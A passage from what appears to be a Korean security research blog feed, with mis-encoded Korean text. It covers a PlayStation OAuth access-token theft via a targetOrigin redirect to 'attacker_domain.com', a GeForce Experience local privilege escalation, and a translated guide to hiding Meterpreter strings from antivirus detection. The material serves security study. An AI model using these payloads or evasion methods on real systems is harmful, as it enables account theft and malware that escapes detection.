&#123;...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    &#125;&#125;<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>í˜¸ìŠ¤íŒ…ëœ ìœ„ ìë°”ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ì•„ë˜ ê³¼ì •ì„ í†µí•´ access tokenì„ í•´ì»¤ì˜ ì„œë²„ë¡œ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>request queryë¥¼ <code>parseResponse()</code> í•¨ìˆ˜ì—ì„œ íŒŒì‹± í•œ ë’¤  <code>sendResponseToApp()</code> ì˜ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬í•´ í˜¸ì¶œí•©ë‹ˆë‹¤.</li><li>query ì¤‘ <code>reqeustID</code> í•„ë“œ ê°’ì´ â€œwindowâ€ ë©´ <code>window.opener.postMessage()</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</li><li><code>window.opener.postMessage()</code> ëŠ” ì²« ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ë¥¼ ë‘ ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ì¸ íŠ¹ì • ë„ë©”ì¸ìœ¼ë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§¤ê°œë³€ìˆ˜ë¡œ queryì™€ <code>targetOrigin</code> í•„ë“œ ê°’ì´ ì „ë‹¬ë˜ë©´ <code>targetOrigin</code> ë„ë©”ì¸ìœ¼ë¡œ queryì— í¬í•¨ë˜ì–´ ìˆëŠ” Access Tokenì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol><p>ì´ë¥¼ ì´ìš©í•œ ìµœì¢… í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>ìœ„ í˜ì´ë¡œë“œë¥¼ OAuth ë°œê¸‰ ì„œë²„ request queryì˜ <code>redirect_uri</code> í•„ë“œ ê°’ìœ¼ë¡œ ë³´ë‚´ë©´ Access Tokenì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>access token stealing</tag>
      
      <tag>playstation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-5990: NVIDIA GeForce Experience Local Privilege Escalation</title>
    <link href="/2020/11/23/idioth/2020-11-23/"/>
    <url>/2020/11/23/idioth/2020-11-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA GeForce Experience 3.20.5.70 ì´ì „ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVDIA GeForce Experienceì˜ GeForce ê·¸ë˜í”½ì¹´ë“œê°€ ì„¤ì¹˜ëœ ì¥ë¹„ë¡œ ì›ê²© ê²Œì„ì„ ì§€ì›í•˜ëŠ” GAMESTREAM ê¸°ëŠ¥ì—ì„œ Local Privilege Escalation ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>nvcontainer.exe í”„ë¡œì„¸ìŠ¤ëŠ” user impersonation ì—†ì´ <code>C:\\ProgramData\\NVIDIA Corporation\\ShadowPlay\\</code> ë””ë ‰í„°ë¦¬ì— <code>CaptureCore.log</code> íŒŒì¼ì„ ì“°ê±°ë‚˜ ìƒì„±í•©ë‹ˆë‹¤. ì´ë•Œ ìƒìœ„ í´ë” ìƒì†ìœ¼ë¡œ ì¸í•´ ëª¨ë“  ì‚¬ìš©ìëŠ” í•´ë‹¹ íŒŒì¼ê³¼ íŒŒì¼ì´ ìˆëŠ” í´ë”ì— ëª¨ë“  ê¶Œí•œì„ ê°–ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ <code>CaptureCore.log</code> íŒŒì¼ì„ ì‚­ì œí•œ í›„ GAMESTREAMì„ ì¬ì‹œì‘í•˜ë©´ <code>nvspapi64.dll</code>ì—ì„œ ì†Œí”„íŠ¸ ë§í¬ì™€ í•˜ë“œ ë§í¬ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ ì§„í–‰í•˜ì—¬ ì‹¬ë³¼ë¦­ ë§í¬ íŒŒì¼ì„ ì‚­ì œí•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ <code>nvspapi64.dll</code>ì—ì„œ ìˆ˜í–‰ë˜ëŠ”ë° ê²€ì‚¬ë¥¼ ì§„í–‰í•œ í›„ <code>CaptureCore.log</code>ì— ëŒ€í•œ í•¸ë“¤ì„ ë‹«ê³  ìµœì¢… ê²½ë¡œë¥¼ ê°€ì ¸ì™€ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ë‹¤ì‹œ í•¸ë“¤ì„ ì—½ë‹ˆë‹¤.</p><p><img src="/2020/11/23/idioth/2020-11-23/image.png"></p><p>ì´ë¥¼ í™œìš©í•˜ì—¬ íŠ¹ì • íŒŒì¼ì— ëŒ€í•œ access eventë¥¼ catch í•˜ëŠ” <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">OpLock</a>ì„ CaptureCore.logì— ì„¤ì •í•œ í›„ ê²€ì‚¬ë¥¼ ì§„í–‰í•˜ë©´ OpLockì´ íŠ¸ë¦¬ê±° ë˜ì–´ C:\Windows\System32 í´ë”ì— arbitrary file creationì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
      <tag>race condition</tag>
      
      <tag>idioth</tag>
      
      <tag>geforce experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.1</title>
    <link href="/2020/11/22/idioth/av_evasion_part1/"/>
    <url>/2020/11/22/idioth/av_evasion_part1/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”. í•˜ì§€ ë§ë¼ëŠ” ê²ƒì€ ë” í•˜ê³  ì‹¶ì€ idiothì…ë‹ˆë‹¤.</p><p>ì›ë˜ ì‚¬ëŒì€ í•˜ì§€ ë§ë¼ë©´ ë” í•˜ê³  ì‹¶ì€ ë²•. ê·¸ë˜ì„œ í‰ì†Œ íƒì§€ ìš°íšŒí•˜ëŠ” ê²ƒì— ëŒ€í•´ ê´€ì‹¬ì´ ë§ì€ë° ê´€ë ¨ ê¸€ì´ ìˆê¸¸ë˜ ë“¤ê³  ì™”ìŠµë‹ˆë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/image.jpg"></p><p>í‰ì†Œì—ëŠ” ê·¸ëƒ¥ í˜¼ì ê³µë¶€í•˜ê³  í˜¼ì ë³´ëŠ”ê±°ë¼ ì§ë…ì§í•´ í•´ë†“ê³  ìŠ¤ìŠ¤ë¡œ ë¨¸ë¦¿ ì†ì—ì„œ ì •ë¦¬í•˜ì˜€ëŠ”ë° ê¸€ë¡œ ì ìœ¼ë ¤ë‹ˆ ê³ ìƒì„ ì¢€ í–ˆìŠµë‹ˆë‹¤. ì˜ì–´ ì‹¤ë ¥ì´ ì¢‹ì€ ê²ƒë„ ì•„ë‹ˆê³  ë²ˆì—­ì„ ë§ì´ í•´ë³¸ ê²ƒë„ ì•„ë‹ˆë¼ ì˜ì—­ê³¼ ì˜¤ì—­ì´ ë‚œë¬´í•˜ëŠ” ê¸€ì´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤â€¦</p><p>ë³´ì‹œë‹¤ê°€ ì´ ë¶€ë¶„ì€ ì™œ ì´ë ‡ê²Œ ë²ˆì—­ì´ ëì§€? í˜¹ì€ ë„ˆë¬´ ì´ìƒí•œë°? í•˜ì‹œëŠ” ê²ƒ ìˆìœ¼ì‹œë©´ ëŒ“ê¸€ë¡œ ë‹¬ì•„ë“œë¦¬ë©´ ëˆˆë¬¼ í˜ë¦¬ë©° ìˆ˜ì •í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering Antivirus evasion</a></p></blockquote><p><strong>tl;dr:</strong> ì´ ê²Œì‹œë¬¼ì€ ëª¨ë“  AV/EDRì„ ìš°íšŒí•˜ê¸° ìœ„í•´ ìë™ìœ¼ë¡œ Meterpreterì„ refactoring í•˜ëŠ” ê²ƒì— ëŒ€í•´ ì„¤ëª…í•œë‹¤. ëª¨ë“  ê¸°ìˆ ì— ëŒ€í•œ ì•„ì´ë””ì–´ì™€ ë¬¸ìì—´ ë‚œë…í™” íŒ¨ìŠ¤ì˜ êµ¬í˜„ì´ ìƒì„¸íˆ ì„¤ëª…ë˜ì–´ìˆë‹¤. API importë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒê³¼ syscall ì¬ì‘ì„±ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ê²Œì‹œê¸€ì´ ë„ˆë¬´ ê¸¸ì–´ì§€ë¯€ë¡œ ë‹¤ìŒ ê¸€ì—ì„œ ì†Œê°œí•  ê²ƒì´ë‹¤. ì†ŒìŠ¤ì½”ë“œëŠ” <a href="https://github.com/scrt/avcleaner">github</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>ê¸°ì—…ì´ ì •ë³´ ì‹œìŠ¤í…œì„ ë³´í˜¸í•˜ê¸° ìœ„í•´ì„œ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì™€ EDR ê°™ì€ ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” í•„ìˆ˜ì ì´ë‹¤. ê³¼ê±°ì—ëŠ” ëª¨ë“  ë©€ì›¨ì–´ íƒì§€ ê¸°ìˆ ì„ ìš°íšŒí•˜ê¸°ê°€ ì‰¬ì› ì§€ë§Œ íƒì§€ ê¸°ìˆ ì´ ë°œì „í•¨ì— ë”°ë¼ ìš°íšŒì— ë” ë§ì€ ë…¸ë ¥ì´ í•„ìš”í•˜ë‹¤.</p><p>ì·¨ì•½ì ì„ ì¦ëª…í•˜ê¸° ìœ„í•œ Proof-of-Conceptê°€ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì— ì˜í•´ ì°¨ë‹¨ëœ ê²½ìš° ìœ„í—˜ì„±ì— ëŒ€í•´ ì´ì•¼ê¸°í•˜ëŠ” ê²ƒì€ ë§¤ìš° ì–´ë µë‹¤. ì´ë¡ ì ìœ¼ë¡œ íƒì§€ë¥¼ ìš°íšŒí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë‹¤ê³  ì–˜ê¸°í•  ìˆ˜ ìˆì§€ë§Œ ì¦ëª…í•˜ê¸°ê°€ ì–´ë µë‹¤.</p><p> ë˜í•œ ì‹œìŠ¤í…œì˜ existing footholdì—ì„œë§Œ ë°œê²¬í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ë“¤ì´ ìˆë‹¤. pentesterê°€ initial levelì— ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ” ê²½ìš° ì‹œìŠ¤í…œì˜ ì‹¤ì œ ë³´ì•ˆ ìƒíƒœë¥¼ ë„ì¶œí•  ìˆ˜ ì—†ë‹¤.</p><p>ë”°ë¼ì„œ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ ìš°íšŒëŠ” í•„ìš”í•˜ë‹¤. SCRT(í•„ìì˜ íŒ€)ì—ì„œëŠ” ê³µê°œì ìœ¼ë¡œ ì‚¬ìš© ê°€ëŠ¥í•œ ì˜¤í”ˆ ì†ŒìŠ¤ íˆ´ì„ ì‚¬ìš©í•´ íˆ´ì„ ì‚¬ìš©í•˜ëŠ”ë° ìˆ™ë ¨ëœ ëˆ„êµ¬ë‚˜ ë”°ë¼ í•  ìˆ˜ ìˆìœ¼ë©° private í•˜ê³  ë¹„ì‹¼ íˆ´ì— ì˜ì¡´í•˜ì§€ ì•Šì•„ë„ ëœë‹¤ëŠ” ì ì„ ê°•ì¡°í•œë‹¤.</p><h1 id="ë¬¸ì œì "><a href="#ë¬¸ì œì " class="headerlink" title="ë¬¸ì œì "></a>ë¬¸ì œì </h1><p>ì‚¬ëŒë“¤ì€ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì˜ íƒì§€ê°€ ì •ì ì¸ì§€ ë™ì ì¸ì§€ ë¶„ë¥˜í•˜ëŠ” ê²ƒì„ ì¢‹ì•„í•œë‹¤. ë³´í†µ ì‹¤í–‰ ì „ì— íŠ¸ë¦¬ê±° ë˜ë©´ ì •ì  íƒì§€ë¡œ ê°„ì£¼ëœë‹¤. í•˜ì§€ë§Œ í”„ë¡œì„¸ìŠ¤ ìƒì„±, in-memory file downloads ê°™ì€ ì´ë²¤íŠ¸ë¥¼ í†µí•´ ë©€ì›¨ì–´ ì‹¤í–‰ ì‹œ signatureì™€ ê°™ì€ ì •ì  íƒì§€ ë©”ì»¤ë‹ˆì¦˜ì´ í˜¸ì¶œë  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì€ ì•„ëŠ” ê²ƒì´ ì¢‹ë‹¤. ëª¨ë“  ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ì— Meterpreterë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜ì •í•´ì•¼ í•œë‹¤.</p><ul><li>íŒŒì¼ ì‹œìŠ¤í…œ ìŠ¤ìº” í˜¹ì€ ë©”ëª¨ë¦¬ ìŠ¤ìº” ì¤‘ì— ëª¨ë“  static signature ìš°íšŒ</li><li>userland API hooking ìš°íšŒì™€ ê´€ë ¨ëœ â€œí–‰ë™ íƒì§€â€ ìš°íšŒ</li></ul><p>MeterpreterëŠ” ì—¬ëŸ¬ ëª¨ë“ˆë¡œ êµ¬ì„±ë˜ë©° ì „ì²´ ì½”ë“œ ë² ì´ìŠ¤ì˜ ì–‘ì´ ë§ê³  ê³„ì† ì—…ë°ì´íŠ¸ë˜ë¯€ë¡œ private forkë¥¼ ìˆ˜í–‰í•˜ê¸° í˜ë“¤ë‹¤. ë”°ë¼ì„œ ìë™ìœ¼ë¡œ ì½”ë“œ ë² ì´ìŠ¤ë¥¼ ìˆ˜ì •í•  ë°©ë²•ì´ í•„ìš”í•˜ë‹¤.</p><h1 id="í•´ê²°-ë°©ì•ˆ"><a href="#í•´ê²°-ë°©ì•ˆ" class="headerlink" title="í•´ê²° ë°©ì•ˆ"></a>í•´ê²° ë°©ì•ˆ</h1><p>ë©€ì›¨ì–´ íƒì§€ëŠ” ëŒ€ë¶€ë¶„ ë¬¸ìì—´, API hook, í˜¹ì€ ë‘˜ì˜ ì¡°í•©ì„ ê¸°ë°˜ìœ¼ë¡œ í•œë‹¤.</p><p>Cylance ê°™ì€ ë¨¸ì‹ ëŸ¬ë‹ classifierë¥¼ êµ¬í˜„í•˜ëŠ” ì œí’ˆì—ì„œë„ ë¬¸ìì—´, API import, í›„í‚¹ í•  ìˆ˜ ìˆëŠ” API í˜¸ì¶œì´ ì—†ëŠ” ë©€ì›¨ì–´ëŠ” íƒì§€ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.</p><p>MeterpreterëŠ” ìˆ˜ì²œ ê°œì˜ ë¬¸ìì—´ì„ ê°€ì§€ê³  ìˆê³  API importsëŠ” ì–´ë– í•œ ë°©ë²•ìœ¼ë¡œë„ ìˆ¨ê²¨ì§€ì§€ ì•Šìœ¼ë©° <code>WriteProcessMemory</code> ê°™ì€ ë¯¼ê°í•œ APIëŠ” userland API hookìœ¼ë¡œ ì‰½ê²Œ intercept í•  ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ ìë™í™”ëœ ë°©ì‹ì„ ì‚¬ìš©í•˜ì—¬ 2ê°œì˜ ì†”ë£¨ì…˜ì„ ë§Œë“¤ì–´ì•¼ í•œë‹¤.</p><ul><li>Source-to-source code refactoring</li><li>LLVM ì»´íŒŒì¼ ì‹œ ì½”ë“œ ë² ì´ìŠ¤ ë‚œë…í™”</li></ul><p>í›„ìê°€ ì„ í˜¸ë˜ëŠ” ë°©ì‹ì´ë©° ë§ì€ ìœ ëª…í•œ ì—°êµ¬ë“¤ì—ì„œ ê°™ì€ ê²°ë¡ ì— ë„ë‹¬í–ˆë‹¤. transformation passë¥¼ í•œ ë²ˆ ì‘ì„±í•´ì„œ ì†Œí”„íŠ¸ì›¨ì–´ì˜ í”„ë¡œê·¸ë˜ë° ì–¸ì–´ë‚˜ target architectureì— ìƒê´€ì—†ì´ ì¬ì‚¬ìš©í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/0.png"></p><p>ì´ë¯¸ì§€ ì¶œì²˜: <a href="http://www.aosabook.org/en/llvm.html">http://www.aosabook.org/en/llvm.html</a></p><p>ê·¸ëŸ¬ë‚˜ ì´ ë°©ë²•ì€ Visual Studioê°€ ì•„ë‹Œ ë‹¤ë¥¸ ì»´íŒŒì¼ëŸ¬ë¡œ Meterpreterë¥¼ ì»´íŒŒì¼í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤. ì´ë¥¼ ìˆ˜ì •í•˜ê¸° ìœ„í•´ 2018ë…„ 12ì›”ì— ëª‡ ê°€ì§€ ì‘ì—…ì„ í¼ë¸”ë¦¬ì‹œí–ˆì§€ë§Œ 1ë…„ì´ ë” ì§€ë‚œ ì§€ê¸ˆë„ ê³µì‹ ì½”ë“œ ë² ì´ìŠ¤ì— ì ìš©ë˜ì§€ ì•Šì•˜ë‹¤.</p><p>ê·¸ë™ì•ˆ ìš°ë¦¬ëŠ” ì²« ë²ˆì§¸ ì ‘ê·¼ë²•ì„ êµ¬í˜„í•˜ê¸°ë¡œ ê²°ì •í–ˆë‹¤. ìµœì²¨ë‹¨ ì†ŒìŠ¤ ì½”ë“œ refactoringë¥¼ ì‚´í´ë³¸ ê²°ê³¼ <em>libTooling</em>(Clang/LLVM toolchainì˜ ì¼ë¶€)ì´ C/C++ ì†ŒìŠ¤ì˜ êµ¬ë¬¸ ë¶„ì„ê³¼ ìˆ˜ì •ì— ê°€ì¥ ì í•©í–ˆë‹¤.</p><p>Note: ì½”ë“œ ë² ì´ìŠ¤ëŠ” Visual Studio ì˜ì¡´ì„±ì´ ê°•í•˜ê¸° ë•Œë¬¸ì— Clangì€ Meterpreterì˜ ë§ì€ ë¶€ë¶„ì˜ êµ¬ë¬¸ ë¶„ì„ì— ì‹¤íŒ¨í•  ê²ƒì´ë‹¤. ê·¸ëŸ¬ë‚˜ íƒ€ê²Ÿ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ë¥¼ 50% í™•ë¥ ë¡œ ìš°íšŒí•  ìˆ˜ ìˆì—ˆë‹¤. ë˜í•œ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³€í™˜í•˜ëŠ” ê²ƒì´ ì»´íŒŒì¼ ì‹œì— ë³€í™˜í•˜ëŠ” ê²ƒë³´ë‹¤ ì¥ì ì´ ìˆì„ ê²ƒì´ë‹¤. í›„ìëŠ” ì—ëŸ¬ ì—†ì´ ì „ì²´ í”„ë¡œì íŠ¸ë¥¼ ì»´íŒŒì¼í•´ì•¼ í•˜ì§€ë§Œ ì „ìëŠ” ìˆ˜ì²œ ê°œì˜ ì»´íŒŒì¼ ì—ëŸ¬ì— íƒ„ë ¥ì ì´ë©° ë¶ˆì™„ì „í•œ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¡œ ëì´ ë‚œë‹¤.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/1.png"></p><p>LLVM passes vs libTooling</p><h2 id="ë¬¸ìì—´-ë‚œë…í™”"><a href="#ë¬¸ìì—´-ë‚œë…í™”" class="headerlink" title="ë¬¸ìì—´ ë‚œë…í™”"></a>ë¬¸ìì—´ ë‚œë…í™”</h2><p>C/C++ì—ì„œ ë¬¸ìì—´ì€ ë‹¤ì–‘í•œ context ì•ˆì— ì¡´ì¬í•œë‹¤.</p><p><em>libTooling</em>ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ë³µì¡í•˜ë¯€ë¡œ Meterpreterì˜ ì½”ë“œ ë² ì´ìŠ¤ì—ì„œ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë¬¸ìì—´ì´ ë‚˜íƒ€ë‚˜ëŠ” ë¶€ë¶„ì„ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ul><li>function arguments</li><li>list initializers</li></ul><h3 id="Fcuntion-arguments"><a href="#Fcuntion-arguments" class="headerlink" title="Fcuntion arguments"></a>Fcuntion arguments</h3><p>ESET Nod32ëŠ” ë‹¤ìŒ ì½”ë“œì—ì„œ <code>ntdll</code> ë¬¸ìì—´ì„ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë¬¸ìì—´ë¡œ íƒì§€í•œë‹¤.</p><pre><code class="hljs cpp">ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))</code></pre><p>ê·¸ëŸ¬ë‚˜ ë‹¤ìŒê³¼ ê°™ì´ ì½”ë“œë¥¼ ì¬ì‘ì„±í•˜ë©´ ì„±ê³µì ìœ¼ë¡œ íƒì§€ë¥¼ ìš°íšŒí•œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> ntdll_str[] = &#123;<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span>&#125;;ntdll = LoadLibrary(ntdll_str)</code></pre><p>ì²« ë²ˆì§¸ ì½”ë“œëŠ” <code>.rdata</code> ì„¹ì…˜ì— <code>&quot;ntdll&quot;</code> ë¬¸ìì—´ì´ ì €ì¥ë¼ì„œ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ì—ê²Œ ì‰½ê²Œ ë°œê²¬ëœë‹¤. ë‘ ë²ˆì§¸ ì½”ë“œëŠ” ë¬¸ìì—´ì´ ì‹¤í–‰ ì‹œ ìŠ¤íƒì— ì €ì¥ë¼ì„œ ë³´í†µ ì •ì ìœ¼ë¡œ êµ¬ë¶„í•  ìˆ˜ ì—†ë‹¤. <em>IDA Pro</em>ì™€ ê°™ì€ íˆ´ì—ì„œëŠ” ë¬¸ìì—´ì„ íƒì§€í•  ìˆ˜ ìˆì§€ë§Œ ë°”ì´ë„ˆë¦¬ë¥¼ ë” ë³µì¡í•˜ê²Œ ë¶„ì„í•´ì•¼ í•œë‹¤.</p><h3 id="List-initializers"><a href="#List-initializers" class="headerlink" title="List initializers"></a>List initializers</h3><p>Meterpreterì˜ ì½”ë“œ ë² ì´ìŠ¤ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì„±ì€ <a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a>ì™€ ê°™ì€ íŒŒì¼ì—ì„œ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">Command customCommands[] =&#123;    COMMAND_REQ(<span class="hljs-string">&quot;extapi_window_enum&quot;</span>, request_window_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_enum&quot;</span>, request_service_enum),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_query&quot;</span>, request_service_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_service_control&quot;</span>, request_service_control),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_get_data&quot;</span>, request_clipboard_get_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_set_data&quot;</span>, request_clipboard_set_data),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_start&quot;</span>, request_clipboard_monitor_start),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_pause&quot;</span>, request_clipboard_monitor_pause),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_resume&quot;</span>, request_clipboard_monitor_resume),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_purge&quot;</span>, request_clipboard_monitor_purge),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_stop&quot;</span>, request_clipboard_monitor_stop),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_clipboard_monitor_dump&quot;</span>, request_clipboard_monitor_dump),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_adsi_domain_query&quot;</span>, request_adsi_domain_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_ntds_parse&quot;</span>, ntds_parse),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_wmi_query&quot;</span>, request_wmi_query),    COMMAND_REQ(<span class="hljs-string">&quot;extapi_pageant_send_query&quot;</span>, request_pageant_send_query),    ...&#125;</code></pre><p>ì´ ë¬¸ìì—´ë“¤ì€ <code>ext_server_espia_x64.dll</code>ì˜ <code>.rdata</code> ì˜ì—­ì— í‰ë¬¸ìœ¼ë¡œ ì €ì¥ë˜ê³  <em>ESET Nod32</em>ì—ì„œ íƒì§€ëœë‹¤.</p><p>ì´ ë¬¸ìì—´ë“¤ì€ list initialzierì— ìœ„ì¹˜í•œ ë§¤í¬ë¡œì˜ ë§¤ê°œë³€ìˆ˜ì´ë‹¤. ëª©í‘œëŠ” ìë™ìœ¼ë¡œ ìœ„ì˜ ì½”ë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì¬ì‘ì„±í•˜ëŠ” ê²ƒì´ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">char</span> hid_extapi_UQOoNXigAPq4[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_vhFHmZ8u2hfz[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span 